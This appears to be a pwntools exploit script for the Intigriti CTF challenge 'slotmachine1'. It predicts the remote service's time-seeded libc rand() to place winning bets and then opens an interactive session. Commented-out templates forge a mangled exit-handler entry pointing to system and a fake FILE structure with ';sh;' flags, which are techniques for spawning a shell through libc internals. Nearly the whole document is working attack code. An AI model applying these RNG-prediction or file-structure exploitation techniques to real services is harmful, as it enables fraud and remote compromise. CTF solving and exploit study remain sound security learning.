from pwn import *
import sys
import os
from ctypes import CDLL
#Cre: vilex1337

_path = "./slotmachine1"
exe = context.binary = ELF(_path, checksec=False)
libc = CDLL("./libc.so")
#ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
add = 'riggedslot1.ctf.intigriti.io'
port = 1332
cmd = f'''
    set solib-search-path {os.getcwd()}
    continue
'''
_mode = 0
_arch = 64

def conn():
    global _mode
    if(len(sys.argv) == 1):
        _mode = 2
        return gdb.debug(_path, cmd)
    if(sys.argv[1] == 'exp'):
        _mode = 3
        return remote(add, port)
    _mode = 1
    return process(_path)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return p(rol(v ^ key, 0x11, 64))

#############  next | count  | type (cxa) | addr                             | arg               | not used
#onexit_fun =  p(0) + p(1)  +  p(4)       + encrypt(libc.sym['system'], key) + p(heap + 0x2c0)  +  p(0)
'''
_op_file = FileStructure()
_op_file.unknown2 = p(0)*2 + p(libc.sym["system"]) + p(0)*3 + p(libc.sym["_IO_wfile_jumps"] - 0x20 ) + p(libc.sym["_IO_2_1_stdout_"] +0x50)
_op_file._wide_data = libc.sym["_IO_2_1_stdout_"]
_op_file.flags = 0xfbad20b1 + (int.from_bytes(b';sh;', 'little') << 32)
_op_file._lock = libc.address + 0x21a200
_tmp_file = bytes(_op_file)
'''

def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

chall = conn()
libc.srand(libc.time(0) + 1)
def _send(_rgx, _data):
    chall.sendafter(_rgx, _data)

def _sendline(_rgx, _data):
    chall.sendlineafter(_rgx, _data)

#rop = ROP(libc)
#rop.find_gadget(['pop rdi', 'ret'])[0]
#log.info

def cal(val, num):
    if num == 0:
        return 99 * val
    if num > 19:
        return 0
    if num > 14:
        return val
    if num > 9:
        return 2 * val
    return 4 * val

def check():
    chall.interactive()
    exit()

def main():
    context.log_level = 'debug'
    balance = 100
    payload = b''
    while(balance <= 0x20A6E):
        c = libc.rand() % 100
        if(c > 29):
            payload += b'1\n'
            balance -=1
        else:
            payload += str(min(balance, 100)).encode() + b'\n'
            balance += cal(min(balance, 100), c)
            if(balance <= 0):
                break
    _send(b'(up to $100 per spin): ', payload)
    check()

if __name__ == "__main__":
    main()
